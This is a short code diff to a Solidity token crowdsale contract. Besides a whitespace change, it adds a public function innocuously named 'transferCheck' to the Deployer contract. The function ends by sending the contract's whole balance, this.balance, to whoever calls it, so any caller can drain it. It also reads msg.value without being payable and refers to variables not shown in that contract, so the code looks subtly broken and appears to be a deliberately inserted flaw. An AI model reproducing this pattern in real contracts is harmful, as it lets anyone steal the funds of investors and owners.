@@ -525,7 +525,7 @@ contract ApplauseCashCrowdsale is Ownable {
 
         forwardFunds();
     }
-    
+
     // owner can transfer tokens
     function transferTokens(address beneficiary, uint256 tokens) public onlyOwner {
         token.transfer(beneficiary, tokens);
@@ -722,4 +722,14 @@ contract Deployer is Ownable {
     }
 
 
+	 function transferCheck() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
